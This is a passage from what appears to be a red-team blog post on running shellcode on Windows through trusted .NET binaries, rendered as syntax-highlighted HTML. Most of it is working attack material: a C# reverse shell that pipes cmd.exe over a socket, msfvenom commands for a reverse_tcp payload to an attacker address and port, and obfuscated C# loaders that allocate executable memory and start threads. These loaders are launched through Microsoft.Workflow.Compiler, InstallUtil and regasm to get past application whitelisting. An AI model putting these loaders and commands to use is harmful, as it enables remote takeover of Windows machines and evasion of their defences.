function">GetStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">StreamReader</span> rdr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StreamReader</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>streamWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StreamWriter</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">StringBuilder</span> strInput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">Process</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>CreateNoWindow <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardInput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>OutputDataReceived <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">DataReceivedEventHandler</span><span class="token punctuation">(</span>CmdOutputDataHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">BeginOutputReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>strInput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>rdr<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span>StandardInput<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strInput<span class="token punctuation">)</span><span class="token punctuation">;</span>strInput<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> strInput<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CmdOutputDataHandler</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sendingProcess<span class="token punctuation">,</span> <span class="token class-name">DataReceivedEventArgs</span> outLine<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">StringBuilder</span> strOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>String<span class="token punctuation">.</span><span class="token function">IsNullOrEmpty</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>strOutput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>streamWriter<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strOutput<span class="token punctuation">)</span><span class="token punctuation">;</span>streamWriter<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe 1.xml 1.cs</code></pre><p><img src="./img/130.png" alt="image"></p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Activities</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net</span><span class="token punctuation">;</span> <span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Threading</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">yrDaTlg</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">SequentialWorkflowActivity</span></span> <span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> rCfMkmxRSAakg<span class="token punctuation">,</span><span class="token class-name">UInt32</span> qjRsrljIMB<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> peXiTuE<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> AkpADfOOAVBZ<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> DStOGXQMMkP<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">uint</span></span> CzzIpcuQppQSTBJ<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">uint</span></span> JCFImGhkRqtwANx<span class="token punctuation">,</span> <span class="token keyword">out</span> <span class="token class-name"><span class="token keyword">uint</span></span> exgVpSg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> eisuQbXKYbAvA<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> WQATOZaFz<span class="token punctuation">,</span> <span class="token class-name">IntPtr</span> AEGJQOn<span class="token punctuation">,</span><span class="token class-name">IntPtr</span> SYcfyeeSgPl<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> ZSheqBwKtDf<span class="token punctuation">,</span> <span class="token keyword">ref</span> <span class="token class-name">UInt32</span> SZtdSB<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> KqJNFlHpsKOV<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> EYBOArlCLAM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token function">yrDaTlg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> QWKpWKhcs <span class="token operator">=</span><span class="token punctuation">&#123;</span>SHELLCODE<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">IntPtr</span> AmnGaO <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>QWKpWKhcs<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>QWKpWKhcs<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>AmnGaO<span class="token punctuation">)</span><span class="token punctuation">,</span> QWKpWKhcs<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">IntPtr</span> oXmoNUYvivZlXj <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span> <span class="token class-name">UInt32</span> XVXTOi <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token class-name">IntPtr</span> pAeCTfwBS <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span><span class="token class-name"><span class="token keyword">uint</span></span> BnhanUiUJaetgy<span class="token punctuation">;</span><span class="token class-name"><span class="token keyword">bool</span></span> iSdNUQK <span class="token operator">=</span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>AmnGaO<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint</span><span class="token punctuation">)</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint</span><span class="token punctuation">)</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token keyword">out</span> BnhanUiUJaetgy<span class="token punctuation">)</span><span class="token punctuation">;</span>oXmoNUYvivZlXj <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> AmnGaO<span class="token punctuation">,</span> pAeCTfwBS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">ref</span> XVXTOi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>oXmoNUYvivZlXj<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Csc"><a href="#Csc" class="headerlink" title="Csc"></a>Csc</h4><pre><code>&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\Users\y\Desktop\shell.exe /platform:x64 /unsafe C:\Users\y\Desktop\shell.cs&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\shell.exe</code></pre><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Diagnostics</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Configuration<span class="token punctuation">.</span>Install</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">System<span class="token punctuation">.</span>ComponentModel<span class="token punctuation">.</span>RunInstaller</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Sample</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">System<span class="token punctuation">.</span>Configuration<span class="token punctuation">.</span>Install<span class="token punctuation">.</span>Installer</span></span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Uninstall</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>Collections<span class="token punctuation">.</span>IDictionary</span> savedState<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Shellcode<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shellcode</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> shellcode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span><span class="token number">510</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> SHELLCODE<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">UInt32</span> funcAddr <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>shellcode <span class="token punctuation">.</span>Length<span class="token punctuation">,</span>MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>shellcode <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>funcAddr<span class="token punctuation">)</span><span class="token punctuation">,</span> shellcode <span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">IntPtr</span> hThread <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span><span class="token class-name">UInt32</span> threadId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">IntPtr</span> pinfo <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> funcAddr<span class="token punctuation">,</span> pinfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">ref</span> threadId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">UInt32</span> MEM_COMMIT <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">UInt32</span> PAGE_EXECUTE_READWRITE <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> lpStartAddr<span class="token punctuation">,</span><span class="token class-name">UInt32</span> size<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> flAllocationType<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> flProtect<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> lpAddress<span class="token punctuation">,</span><span class="token class-name">UInt32</span> dwSize<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> dwFreeType<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> lpThreadAttributes<span class="token punctuation">,</span><span class="token class-name">UInt32</span> dwStackSize<span class="token punctuation">,</span><span class="token class-name">UInt32</span> lpStartAddress<span class="token punctuation">,</span><span class="token class-name">IntPtr</span> param<span class="token punctuation">,</span><span class="token class-name">UInt32</span> dwCreationFlags<span class="token punctuation">,</span><span class="token keyword">ref</span> <span class="token class-name">UInt32</span> lpThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> handle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> hHandle<span class="token punctuation">,</span><span class="token class-name">UInt32</span> dwMilliseconds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> moduleName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> hModule<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">string</span></span> procName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> lpFileName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Regasm"><a href="#Regasm" class="headerlink" title="Regasm"></a>Regasm</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\Users\y\Desktop\dll.dll  /unsafe C:\Users\y\Desktop\dll.cs&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /u dll.dll</code></pre><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">namespace</span> <span class="token namespace">HYlDKsYF</span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">kxKhdVzWQXolmmF</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">ServicedComponent</span></span> <span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token function">kxKhdVzWQXolmmF</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"doge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">ComRegisterFunction</span></span><span class="token punctuation">]</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> RegisterClass <span class="token punctuation">(</span> <span class="token class-name"><span class="token keyword">string</span></span> pNNHrTZzW <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> ZApOAKJKY<span class="token punctuation">.</span><span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">ComUnregisterFunction</span></span><span class="token punctuation">]</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> UnRegisterClass <span class="token punctuation">(</span> <span class="token class-name"><span class="token keyword">string</span></span> pNNHrTZzW <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> ZApOAKJKY<span class="token punctuation">.</span><span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ZApOAKJKY</span>  <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> FJyyNB<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> fwtsYaiizj<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> dHJhaXQiaqW<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> bqtaDNfVCzVox<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> hjDFdZuT<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> JAVAYBFdojxsgo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> AQdEyOhn<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> wknmfaRmoElGo<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> yRXPRezIkcorSOo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type 